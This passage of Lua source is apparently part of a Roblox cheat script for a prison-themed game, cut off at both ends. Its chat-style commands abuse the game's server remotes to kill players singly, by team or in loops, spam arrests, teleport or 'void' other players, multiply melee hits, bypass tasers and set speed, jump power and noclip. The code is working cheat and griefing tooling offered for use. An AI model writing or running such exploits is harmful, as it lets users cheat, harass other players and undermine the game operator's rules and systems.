			local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
			if tonumber(Arg2) ~= nil then
				Gun["FireRate"] = tonumber(Arg2)
				Notify("Set a gun fire speed to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		else
			Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("burst") or Command("burstbullets") or Command("bullets") then
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
			local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
			if tonumber(Arg2) ~= nil then
				Gun["Bullets"] = tonumber(Arg2)
				Notify("Set a gun burst bullets to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		else
			Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("reloadtime") or Command("reloadtimes") then
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
			local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
			if tonumber(Arg2) ~= nil then
				Gun["ReloadTime"] = tonumber(Arg2)
				Notify("Set a gun reload time to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		else
			Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("criminal") or Command("criminals") or Command("crim") or Command("crims") or Command("crimes") or Command("crime") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Become a criminal", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("neutral") or Command("neutrals") then
		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
		Notify("Become neutral", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("red") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright red").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("blue") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Deep blue").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("black") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really black").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("pink") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Hot pink").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("grey") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Ghost grey").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("white") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("White").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("brown") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Brown").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("purple") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Royal purple").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("green") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright green").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("yellow") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright yellow").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("orange") then
		local savedcf = GetPos()
		local savedcamcf = GetCamPos()
		workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Neon orange").Name)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		workspace.CurrentCamera.CFrame = savedcamcf
		Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("chatnotify") then
		States.ChatNotify = true
		Notify("Turn chat notify on", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("nochatnotify") or Command("unchatnotify") then
		States.ChatNotify = false
		Notify("Turn chat notify off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("taserbypass") or Command("lock") or Command("antitaser") then
		States.TaserBypass = true
		Notify("Turn taser bypass on", Color3.fromRGB(0, 255, 0), "Success")
		game.Players.LocalPlayer.CharacterAdded:Connect(function()
			if States.TaserBypass then
				wait(.2)
				game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
			end
		end)
	end
	if Command("notaserbypass") or Command("unlock") or Command("untaserbypass") then
		States.TaserBypass = false
		Notify("Turn taser bypass off", Color3.fromRGB(0, 255, 0), "Success")
		game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = false
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
	end
	if Command("color") then
		if Arg2 ~= nil and Arg3 == nil then
			local savedcf = GetPos()
			workspace.Remote.loadchar:InvokeServer(nil, Arg2)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 == nil then
			local savedcf = GetPos()
			workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 ~= nil then
			local savedcf = GetPos()
			workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3.." "..Arg4)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		end
		Notify("Changed name tag color", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("print") then
		print(Message)
		Notify("Printed", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("warn") then
		warn(Message)
		Notify("Warned", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("error") then
		Notify("Printed error", Color3.fromRGB(0, 255, 0), "Success")
		error(Message)
	end
	if Command("chat") then
		Chat(Message)
		Notify("Chatted", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("copychat") then
		States.CopyChat = true
		Notify("Turn copy chat on", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("uncopychat") then
		States.CopyChat = false
		Notify("Turn copy chat off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("tase") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Tase(Player)
			Notify("Tased "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("noshield") or Command("antishield") then
		States.Anti_Shield = true
		Notify("Turn anti shield users on", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			for i,v in pairs(game.Players:GetPlayers()) do
				pcall(function()
					if workspace[v.Name].Torso:FindFirstChild("ShieldFolder") then
						workspace[v.Name].Torso:FindFirstChild("ShieldFolder"):Destroy()
					end
				end)
			end
		end
	end
	if Command("unantishield") then
		States.Anti_Shield = false
		Notify("Turn anti shield users off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("kill") or Command("kills") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Kill(Player)
			Notify("Killed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("killall") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				Kill(v)
			end
		end
		Notify("Killed all players", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("killinmate") or Command("killinmates") or Command("killsinmate") or Command("killsinmates") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				if v.TeamColor.Name == "Bright orange" then
					Kill(v)
				end
			end
		end
		Notify("Killed all inmates", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("killguard") or Command("killsguard") or Command("killguards") or Command("killsguards") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				if v.TeamColor.Name == "Bright blue" then
					Kill(v)
				end
			end
		end
		Notify("Killed all guards", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("killcriminal") or Command("killscriminal") or Command("killcriminals") or Command("killscriminals") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				if v.TeamColor.Name == "Really red" then
					Kill(v)
				end
			end
		end
		Notify("Killed all criminals", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkill") or Command("loopkills") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and not LoopKill[Player.UserId] then
			LoopKill[Player.UserId] = {Player = Player}
			Notify("Looping kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found / already loop kills", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("unloopkill") or Command("unloopkills") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil and LoopKill[Player.UserId] then
			LoopKill[Player.UserId] = nil
			Notify("Unloop kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found / Player has no loop kills", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("loopkillguard") or Command("loopkillguards") or Command("loopkillsguard") or Command("loopkillsguards") or Command("loopkillcop") or Command("loopkillpolices") or Command("loopkillspolices") then
		States.LoopKill_Guards = true
		Notify("Looping kills all guards", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.LoopKill_Guards then
				for i,v in pairs(game.Teams.Guards:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						pcall(function()
							if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
								Kill(v)
							end
						end)
					end
				end
			end
		end
	end
	if Command("unloopkillguard") or Command("unloopkillguards") or Command("unloopkillsguard") or Command("unloopkillsguards") or Command("unloopkillcop") or Command("unloopkillpolices") or Command("unloopkillspolices") then
		States.LoopKill_Guards = false
		Notify("Unloop kills all guards", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkillinmate") or Command("loopkillinmates") or Command("loopkillsinmate") or Command("loopkillsinmates") or Command("loopkillprisoner") or Command("loopkillprisoners") then
		States.LoopKill_Inmates = true
		Notify("Looping kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.LoopKill_Inmates then
				for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						pcall(function()
							if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
								Kill(v)
							end
						end)
					end
				end
			end
		end
	end
	if Command("unloopkillinmate") or Command("unloopkillinmates") or Command("unloopkillsinmate") or Command("unloopkillsinmates") or Command("unloopkillprisoner") or Command("unloopkillprisoners") then
		States.LoopKill_Inmates = false
		Notify("Unloop kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkillcriminal") or Command("loopkillcriminals") or Command("loopkillscriminal") or Command("loopkillscriminals") or Command("loopkillcrim") or Command("loopkillcrims") then
		States.LoopKill_Criminals = true
		Notify("Looping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.LoopKill_Criminals then
				for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						pcall(function()
							if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
								Kill(v)
							end
						end)
					end
				end
			end
		end
	end
	if Command("unloopkillcriminal") or Command("unloopkillcriminals") or Command("unloopkillscriminal") or Command("unloopkillscrriminals") or Command("unloopkillcrim") or Command("unloopkillcrims") then
		States.LoopKill_Criminals = false
		Notify("Unlooping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopkillall") or Command("loopkillsall") then
		States.LoopKill_Others = true
		Notify("Looping kills all players", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.LoopKill_Others then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= game.Players.LocalPlayer then
						pcall(function()
							if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
								Kill(v)
							end
						end)
					end
				end
			end
		end
	end
	if Command("unloopkillall") or Command("unloopkillsall") then
		States.LoopKill_Criminals = false
		States.LoopKill_Guards = false
		States.LoopKill_Inmates = false
		States.LoopKill_Others = false
		Notify("Unlooping kills all players", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("goto") or Command("to") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[Player.Name].HumanoidRootPart.CFrame
			Notify("Go to "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("re") or Command("refresh") then
		if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
			if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
			end
		else
			if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
		end
		Notify("Refreshed", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("res") or Command("respawn") then
		if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
			workspace.Remote.loadchar:InvokeServer()
		else
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
		end
		Notify("Respawned", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("looparrest") or Command("spamarrest") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Notify("Spam arresting "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			States.SpamArrest = true
			repeat wait()
				if game.Players[Player.Name] and States.SpamArrest then
					local Player_Previos_Team = Player.TeamColor.Name
					if Player.TeamColor.Name == "Bright orange" then
						Teleport(Player, CFrame.new(979.55584716797, 99.990005493164, 2341.4069824219))
					end
					if Player.TeamColor.Name ~= "Bright orange" and Player.TeamColor.Name ~= "Really red" then
						repeat Teleport(Player, CFrame.new(-976, 110, 2070)) until Player.TeamColor.Name == "Really red" or not game.Players[Player.Name]
					end
					if Player_Previos_Team == "Bright orange" then
						repeat wait()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
							for i = 1,1000 do
								coroutine.wrap(function()
									ArrestEvent(Player, math.huge)
								end)()
							end
						until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
					else
						if Player.TeamColor.Name == "Really red" then
							repeat wait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								for i = 1,1000 do
									coroutine.wrap(function()
										ArrestEvent(Player, math.huge)
									end)()
								end
							until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
						end
					end
				end
			until not game.Players[Player.Name] or not States.SpamArrest
		end
	end
	if Command("unlooparrest") or Command("unspamarrest") then
		States.SpamArrest = false
		Notify("Unspam arrest", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("view") or Command("spectate") or Command("watch") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Watching = Player
			Notify("Viewing "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
		while wait() do
			if Watching ~= nil then
				pcall(function()
					workspace.CurrentCamera.CameraSubject = workspace[Watching.Name]
				end)
			end
		end
	end
	if Command("antifling") then
		States.Anti_Fling = true
		Notify("Turn anti fling on", Color3.fromRGB(0, 255, 0), "Success")
		game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
		game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
			if States.Anti_Fling then
				pcall(function()
					game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
				end)
			end
		end)
	end
	if Command("statue") then
		States.Statue = true
		game.Players.LocalPlayer.Character:Connect(function()
			if States.Statue then
				
			end
		end)
	end
	if Command("unstatue") then
		States.Statue = false
	end
	if Command("noclip") or Command("noclips") then
		States.Noclips = true
		Notify("Turn no clips on", Color3.fromRGB(0, 255, 0), "Success")
		game:GetService("RunService").Stepped:Connect(function()
			if States.Noclips then
				pcall(function()
					game.Players.LocalPlayer.Character:FindFirstChild("Head").CanCollide = false
					game.Players.LocalPlayer.Character:FindFirstChild("Torso").CanCollide = false
				end)
			end
		end)
	end
	if Command("clip") or Command("clips") then
		States.Noclips = false
		Notify("Turn no clips off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("unantifling") then
		States.Anti_Fling = false
		Notify("Turn anti fling off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("antivest") or Command("anticrash") then
		States.Anti_Crash = true
		Notify("Turn anti armor spammer on", Color3.fromRGB(0, 255, 0), "Success")
		coroutine.wrap(function()
			while wait() do
				if States.Anti_Crash then
					for i,v in pairs(game.Players:GetPlayers()) do
						pcall(function()
							v.Character.vest:Destroy()
						end)
					end
				end
			end
		end)()
	end
	if Command("unantivest") or Command("unanticrash") then
		States.Anti_Crash = false
		Notify("Turn anti armor spammer off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("fastpunch") or Command("speedpunch") or Command("speedlypunch") or Command("superspeedpunch") then
		States.Fast_Punch = true
		Notify("Turn fast punch on", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("slowpunch") or Command("normalspeedpunch") or Command("nofastpunch") or Command("unfastpunch") then
		States.Fast_Punch = false
		Notify("Turn fast punch off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("superpunch") or Command("onepunch") then
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local MeleeEvent = ReplicatedStorage:FindFirstChild("meleeEvent")
		local Mouse = game.Players.LocalPlayer:GetMouse()
		local Punch = false
		local Cooldown = false
		States.SuperPunch = true
		Notify("Turn super punch on", Color3.fromRGB(0, 255, 0), "Success")

		local function Punch()
			if not States.Fast_Punch then
				Cooldown = true
				local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
				Part.Transparency = 1
				Part.Size = Vector3.new(5, 2, 3)
				Part.CanCollide = false
				local Weld = Instance.new("Weld", Part)
				Weld.Part0 = game.Players.LocalPlayer.Character.Torso
				Weld.Part1 = Part
				Weld.C1 = CFrame.new(0, 0, 2)
				Part.Touched:connect(function(Touch)
					if game.Players:FindFirstChild(Touch.Parent.Name) then
						local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
						if plr.Name ~= game.Players.LocalPlayer.Name then
							Part:Destroy()
							for i = 1,100 do
								MeleeEvent:FireServer(plr)
							end
						end
					end
				end)
				wait(0.9)
				Cooldown = false
				Part:Destroy()
			else
				Cooldown = true
				local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
				Part.Transparency = 1
				Part.Size = Vector3.new(5, 2, 3)
				Part.CanCollide = false
				local Weld = Instance.new("Weld", Part)
				Weld.Part0 = game.Players.LocalPlayer.Character.Torso
				Weld.Part1 = Part
				Weld.C1 = CFrame.new(0, 0, 2)
				Part.Touched:connect(function(Touch)
					if game.Players:FindFirstChild(Touch.Parent.Name) then
						local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
						if plr.Name ~= game.Players.LocalPlayer.Name then
							Part:Destroy()
							for i = 1,100 do
								MeleeEvent:FireServer(plr)
							end
						end
					end
				end)
				wait(0.1)
				Cooldown = false
				Part:Destroy()
			end
		end
		Mouse.KeyDown:connect(function(Key)
			if not Cooldown and States.SuperPunch then
				if Key:lower() == "f" then
					Punch()
				end				
			end
		end)
	end
	if Command("normalpunch") or Command("oldpunch") or Command("nosuperpunch") or Command("stoponepunch") or Command("unonepunch") or Command("unsuperpunch") then
		States.SuperPunch = false
		Notify("Turn super punch off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("superknife") then
		local Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
		if not Knife then
			workspace.Remote.ItemHandler:InvokeServer(workspace["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP)
		end
		wait()
		Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
		if Knife then
			local Cooldown = false
			local Hitting = false
			local Hitted = false
			Knife.Equipped:Connect(function()
				Knife.Activated:Connect(function()
					if not Cooldown then
						Cooldown = true
						Hitting = true
						for i,v in pairs(Knife:GetChildren()) do
							if v:IsA("Part") then
								v.Touched:Connect(function(Hit)
									if Hit and Hit.Parent ~= game.Players.LocalPlayer and not Hitted and Hitting then
										Hitted = true
										for i = 1,25 do
											game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
										end
									end
								end)
							end
						end
						wait(0.5)
						Cooldown = false
						Hitting = false
						Hitted = false
					end
				end)
			end)
		end
		Notify("Obtained super knife", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("unview") or Command("unspectate") or Command("stopwatch") or Command("unwatch") then
		Watching = nil
		workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		Notify("Unviewed", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("antivoid") or Command("antifell") then
		States.Anti_Void = true
		Notify("Turn anti void on", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.Anti_Void then
				pcall(function()
					if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < 1 then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
					end
				end)
			end
		end
	end
	if Command("unantivoid") or Command("unantifell") then
		States.Anti_Void = false
		Notify("Turn anti void off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("bring") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Teleport(GetPlayer(Arg2), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
			Notify("Brought "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("teleport") or Command("tp") then
		local Player = GetPlayer(Arg2)
		local Player2 = GetPlayer(Arg3)
		if Player ~= nil and Player2 ~= nil then
			TeleportV(Player, Player2)
			Notify("Teleported "..Player.Name.." to "..Player2.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(0, 255, 0), "Error")
		end
	end
	if Command("void") then
		local Player = GetPlayer(Arg2)
		if Player ~= nil then
			Teleport(Player, CFrame.new(999999, 999999, 999999))
			Notify("Voided "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("killaura") then
		States.Kill_Aura = true
		Notify("Turn kill aura on", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("nokillaura") or Command("unkillaura") then
		States.Kill_Aura = false
		Notify("Turn kill aura off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("auto") or Command("autore") or Command("autorefresh") then
		States.Auto_Refresh = true
		Notify("Turn auto refresh on", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.Auto_Refresh == true then
				pcall(function()
					if game.Players.LocalPlayer.Character.Humanoid.Health < 1 then
						if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
							if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
								local savedcf = GetPos()
								local savedcamcf = GetCamPos()
								workspace.Remote.loadchar:InvokeServer()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
								workspace.CurrentCamera.CFrame = savedcamcf
							end
						else
							if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
								local savedcf = GetPos()
								local savedcamcf = GetCamPos()
								workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
								workspace.CurrentCamera.CFrame = savedcamcf
								workspace.Remote.TeamEvent:FireServer("Medium stone grey")
							end
						end
					end
				end)
			end
		end
	end
	if Command("unauto") or Command("auntore") or Command("unautorefresh") then
		States.Auto_Refresh = false
		Notify("Turn auto refresh off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("prefix") or Command("newprefix") or Command("changeprefix") then
		local NewPrefix = Arg2
		if NewPrefix ~= nil then
			Prefix = NewPrefix
			Execute.PlaceholderText = "Press "..Prefix.." To Enter"
			Notify("Changed prefix to "..NewPrefix, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Text needed", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("speed") or Command("walkspeed") or Command("setspeed") or Command("setwalkspeed") then
		local WalkSpeed = tonumber(Arg2)
		if WalkSpeed ~= nil then
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
			Notify("Changed walk speed to "..WalkSpeed, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("jumppower") or Command("jumphigh") or Command("setjumppower") then
		local JumpPower = tonumber(Arg2)
		if JumpPower ~= nil then
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
			Notify("Changed jump power to "..JumpPower, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("hipheight") or Command("sethipheight") then
		local HipHeight = tonumber(Arg2)
		if HipHeight ~= nil then
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = HipHeight
			Notify("Changed hip height to "..HipHeight, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
		end
